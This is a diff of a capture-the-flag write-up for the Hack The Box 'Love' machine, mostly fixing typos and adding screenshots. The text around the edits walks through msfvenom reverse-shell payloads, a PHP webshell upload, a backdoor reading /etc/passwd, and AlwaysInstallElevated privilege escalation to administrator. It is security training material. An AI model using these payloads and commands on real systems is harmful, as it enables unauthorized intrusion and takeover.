@@ -69,7 +69,7 @@ At this point we might be tempted to bruteforce the login with *Hydra*, but it's
 In the worst case (I doubt it's the case here though), it could get our IP address banned. So, let's look at the other options we have.
 
 One thing we can do is check if the application is vulnerable to SQL injections.
-To test that, we simply input a " ' " in the username and password fields. If the application returns a weird error, it indicates that it doesn't properly sanitize users input and might therefore be vulnerable.\\
+To test that, we simply input a " ' " in the username and password fields. If the application returns a weird error, it indicates that it doesn't properly sanitize users' inputs and might therefore be vulnerable.\\
 Unfortunately it is not the case here. If it were the case or if we saw an URL of the form */something.php?**id=1***, we could use *sqlmap* to try SQLis.
 
 Other than */admin*, dirb found a few other accessible directories: 
@@ -103,16 +103,16 @@ The results of those tools is the following:
 ![SMB]({{https://jsom1.github.io/}}/_images/htb_love_smb.png)
 </div>
 
-No luck, none of them found anythin. We saw in nmap's output that it ran the following NSE scripts for SMB enumeration: *smb-os-discovery*, *smb-security-mode*, *smb2-security-mode* and *smb2-time*.
-There are however other available scripts, such as *smb-enum-shares*. Similarly to smbclient and smbmap, it tries to list share:
+No luck, none of them found anything. We saw in nmap's output that it ran the following NSE scripts for SMB enumeration: *smb-os-discovery*, *smb-security-mode*, *smb2-security-mode* and *smb2-time*.
+There are however other available scripts, such as *smb-enum-shares*. Similarly to smbclient and smbmap, it tries to list available shares:
 
 <div class="img_container">
 ![SMB nse]({{https://jsom1.github.io/}}/_images/htb_love_smbnse.png)
 </div>
 
 Although the script couldn't access the shares, they are still listed. We see the shares *ADMIN$*, *C$* and *IPC$*. Those are the defaut shares that are created when we create a CIFS (Common Internet File System) server. SMB is the modern concept of CIFS.
-Anyways, I hoped we would find a non default share...\\
-There are also a variety of nse scripts which analyze vulnerabilities such as *ms07-029*, *ms06-025*, *conficker*, and so on. We can run all of them at once with the following command:
+Anyways, I hoped we would find an accessible non default share...\\
+There are also a variety of *nse* scripts which analyze vulnerabilities such as *ms07-029*, *ms06-025*, *conficker*, and so on. We can run all of them at once with the following command:
 
 ````
 sudo nmap --script smb-vuln* <target IP>
@@ -125,7 +125,7 @@ sudo nmap --script smb-vuln* <target IP>
 We see the server is not vulnerable to *ms10-054*, and we don't know about *ms10-061*. This time, the service running on port 5000 is identified as *upnp*.\\
 I don't know this service, and Google indicates it stands for "Universal Plug and Play". 
 It is a set of networking protocols that permits networked devices, such as personal computers, printers, Internet gateways, Wi-Fi access points and mobile devices to seamlessly discover each other's presence on the network and establish functional network services.\\
-That could be interesting later. Even though we find nothing on SMB, let's use a last too for the sake of enumeration completeness. We will finish by using **enum4linux**, which is going to automate the manual process we just went through:
+It's weird nmap now detects a different service, but that could be interesting later. Even though we find nothing on SMB, let's use a last tool for the sake of enumeration completeness. We will finish by using **enum4linux**, which is going to automate the manual process we just went through:
 
 <div class="img_container">
 ![enum4linux]({{https://jsom1.github.io/}}/_images/htb_love_enum4l.png)
@@ -174,7 +174,7 @@ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f 
 `````
 
 I then started a *multi/handler* and uploaded the file on the server. En error message appears: "This program cannot be run in DOS mode.". I Googled it and it appears this error occurs when we try to run a program intended for Windows inside DOS. DOS (Disk Operating System) is an OS that runs from a hard disk drive. It can also refer to a particular family of disk OS, most commonly MS-DOS (Microsoft-DOS).\\
-Anyways, I didn't think about it so far, but we can inspect the page and try to find the definition of the function that scans the input. To do so we right click on the page, click *inspect element* and then go to the *Debugger* tab. There, we see that when we submit a file, this latter is passed to the *validateForm()* function. We also see it definition, which is the following:
+Anyways, I didn't think about it so far, but we can inspect the page and try to find the definition of the function that scans the input. To do so we right click on the page, click *inspect element* and then go to the *Debugger* tab. There, we see that when we submit a file, this latter is passed to the *validateForm()* function. We also see its definition, which is the following:
 
 ````
 function validateForm() {
@@ -199,7 +199,7 @@ Great, we have credentials! We can go back to *love.htb/admin* and use them here
 ![dashboard]({{https://jsom1.github.io/}}/_images/htb_love_db.png)
 </div>
 
-We land on a dashboard. The menu contains different tabs, but all of them are empty. We see a user called *Neovic Devierte*. When clicking on the username, we see we can update the profile. A menu opens, and we can add a photo. Maybe we can add a file, so let's try to upload our *windows/meterpreter/reverse_tcp* payload. I don't show the output here because it didn't work... Is is because of the "DOS" error we saw earlier?\\
+We land on a dashboard. The menu contains different tabs, but all of them are empty. We see a user called *Neovic Devierte*. When clicking on the username, we see we can update the profile. A menu opens, and we can add a photo. Maybe we can add a file, so let's try to upload our *windows/meterpreter/reverse_tcp* payload. I don't show the output here because it didn't work... Is it because of the "DOS" error we saw earlier?\\
 We can also try to use a webshell from */usr/share/webshells*. Because the application is written in PHP, we'll use */usr/share/webshells/php/php-reverse-shell.php*. We must modify two lines in the code:
 
 ````
@@ -260,12 +260,18 @@ Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 <!--    http://michaeldaw.org   2006    -->
 ````
 
-Let's try to upload that and see if we can issue commands. The usage says *http://target.com/simple-backdoor.php?cmd=<cmd>*, but it doesn't work. After looking around, I finally found the uploaded a file (and also the other I uploaded):
+Let's try to upload that and see if we can issue commands. The usage says *http://target.com/simple-backdoor.php?cmd=\<cmd\>*. We have to find where the file was uploaded. After looking around, I found it (and also the other I uploaded) in the */images* directory (no surprise):
 
 <div class="img_container">
 ![uploaded script]({{https://jsom1.github.io/}}/_images/htb_love_images.png)
 </div>
- 
+
+Let's try to use it with the given syntax and execute a simple command such as *whoami*:
+
+<div class="img_container">
+![uploaded script]({{https://jsom1.github.io/}}/_images/htb_love_whoami.png)
+</div>
+
 The script works! We see we're in as *phoebe*. At this point we could probably read the *user.txt* flag directly, but we'll need a shell at some point so let's try that instead.\\
 Since we can execute this command, we should also be able to execute a payload to get a reverse shell. The payload we'll use is:
  
@@ -338,7 +344,8 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 ``````
 
 The ouput of both commands must be "1" to be exploitable. If it is the case, we have 2 possibilities:
-1) Generate a payload to add user to admin group: *sudo msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi*
+
+1) Generate a payload to add user to admin group: *sudo msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi*\\
 2) Generate a reverse shell payload: *sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST <IP> LPORT <PORT> -f msi -o reverse.msi*.
  
 Let's try the second one:
@@ -353,7 +360,7 @@ We upload this file onto the server the same way we uploaded the previous ones a
 love.htb/images/simple-backdoor.php?cmd=reverse.msi
 `````
 
-If everything works as expected, we should get a reverse shell:
+If everything works as expected, we should get a reverse shell as administrator:
  
 <div class="img_container">
 ![root]({{https://jsom1.github.io/}}/_images/htb_love_root.png)
@@ -363,7 +370,7 @@ And we can grab the flag! I don't see the link between "Always Install Elevated"
 That's probably it, it must execute our file with nt\system permissions.
  
 <div class="img_container">
-![pwn]({{https://jsom1.github.io/}}/_images/htb_love_pwn.png)
+![pwn]({{https://jsom1.github.io/}}/_images/htb_love_pwn.png){: height="300px" width = 400px"}
 </div>
 
 <ins>**My thoughts**</ins>
